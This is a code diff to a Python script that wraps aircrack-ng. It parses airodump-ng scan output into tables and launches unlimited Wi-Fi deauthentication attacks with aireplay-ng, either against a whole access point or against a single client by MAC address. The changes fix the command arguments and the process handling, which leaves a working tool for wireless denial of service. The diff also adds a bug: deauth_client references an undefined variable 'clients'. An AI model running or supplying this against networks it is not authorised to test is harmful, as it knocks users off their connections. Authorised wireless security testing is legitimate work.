@@ -55,19 +55,18 @@ def kill(airodump_pid):
 
 def display_table(file_path):
 	try:
-		os.system('clear')
 		with open(file_path, 'r') as f:
+			os.system('clear')
 			reader = csv.reader(f)
 			rows = list(reader)
-
 			if len(rows) < 2:
 				sys.stdout.write("No data available yet.\n")
 				sys.stdout.flush()
 				return
-
+			
 			tables = []
 			current_table = []
-
+			
 			for row in rows:
 				if all(cell.strip() == '' for cell in row):
 					if current_table:
@@ -77,23 +76,18 @@ def display_table(file_path):
 					current_table.append(row)
 			if current_table:
 				tables.append(current_table)
-
 			for table in tables:
 				num_columns = max(len(row) for row in table)
 				col_widths = [max(len(str(row[i])) if i < len(row) else 0 for row in table) for i in range(num_columns)]
 				table_output = ""
-
 				for row in table:
 					row_output = " | ".join(f"{str(col):<{col_widths[i]}}" if i < len(row) else " " * col_widths[i] for i, col in enumerate(row))
 					table_output += row_output + "\n"
-
 				sys.stdout.write(table_output + "\n")
 				sys.stdout.flush()
-
 			a = input("Type STOP to kill it, (k or 1 or stop or s ) or enter to continue...").lower()
 			if a in ("s", "k", "1", "stop"):
 				return 0
-
 	except FileNotFoundError:
 		sys.stdout.write(f"File {file_path} not found. Waiting for data...\n")
 		sys.stdout.flush()
@@ -104,55 +98,72 @@ def display_table(file_path):
 def deauth_ap(bssid, channel):
 	print(f"Deauthenticating AP {bssid} on channel {channel}...")
 	airodump_command = [
-		"sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, "-e", channel
+		"sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, "--ignore-negative-one"
 	]
 	command_str = " ".join(airodump_command)
 	print(f"Executing {command_str}")
-	airodump_proc = subprocess.Popen(airodump_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-	airodump_pid = airodump_proc.pid
-	print(f"airodump-ng started with PID {airodump_pid}")
+	
 	try:
-		stdout, stderr = airodump_proc.communicate(timeout=10)  # Timeout after 10 seconds (adjust as needed)
+		airodump_proc = subprocess.Popen(airodump_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+		airodump_pid = airodump_proc.pid
+		print(f"aireplay-ng started with PID {airodump_pid}")
+		
+		stdout, stderr = airodump_proc.communicate(timeout=10)  # Timeout after 10 seconds
 		print("\n--- Command Output ---")
-		print(stdout)
+		print(stdout.decode())
 		if stderr.strip():
 			print("\n--- Command Errors ---")
-			print(stderr)
+			print(stderr.decode())
 	except subprocess.TimeoutExpired:
 		print("\nCommand is taking too long. You can stop it manually.")
+		airodump_proc.terminate()  # Terminate process if it times out
 	except Exception as e:
 		print(f"\nAn error occurred while executing the command: {e}")
+	
 	while True:
-		a = input("Type STOP to kill it, (k or 1 or stop or s ) or enter to continue...").lower()
+		a = input("Type STOP to kill it, (k or 1 or stop or s) or press Enter to continue...").lower()
 		if a in ("s", "k", "1", "stop"):
-			kill(airodump_pid)
+			try:
+				airodump_proc.terminate()
+				print("Process terminated.")
+			except Exception as e:
+				print(f"Failed to terminate process: {e}")
 			break
 
-def deauth_client(bssid, channel,essid):
-	print(f"Deauthenticating client {essid} on AP {bssid} at channel {channel}...")
+
+def deauth_client(bssid, channel, client):
+	print(f"Deauthenticating client {clients} on AP {bssid} at channel {channel}...")
 	airodump_command = [
-		"sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, "-e", channel, ""
+		"sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, "-c", client, "--ignore-negative-one"
 	]
 	command_str = " ".join(airodump_command)
 	print(f"Executing {command_str}")
-	airodump_proc = subprocess.Popen(airodump_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-	airodump_pid = airodump_proc.pid
-	print(f"airodump-ng started with PID {airodump_pid}")
+	
 	try:
-		stdout, stderr = airodump_proc.communicate(timeout=10)  # Timeout after 10 seconds (adjust as needed)
+		airodump_proc = subprocess.Popen(airodump_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+		airodump_pid = airodump_proc.pid
+		print(f"aireplay-ng started with PID {airodump_pid}")
+		
+		stdout, stderr = airodump_proc.communicate(timeout=10)  # Timeout after 10 seconds
 		print("\n--- Command Output ---")
-		print(stdout)
+		print(stdout.decode())
 		if stderr.strip():
 			print("\n--- Command Errors ---")
-			print(stderr)
+			print(stderr.decode())
 	except subprocess.TimeoutExpired:
 		print("\nCommand is taking too long. You can stop it manually.")
+		airodump_proc.terminate()  # Terminate process if it times out
 	except Exception as e:
 		print(f"\nAn error occurred while executing the command: {e}")
+	
 	a = input("Type STOP to kill it, (k or 1 or stop or s ) or enter to continue...").lower()
 	if a in ("s", "k", "1", "stop"):
-		kill(airodump_pid)
+		try:
+			airodump_proc.terminate()
+		except Exception as e:
+			print(f"Failed to terminate process: {e}")
 		return 0
+
 
 def fun():
 	while True:
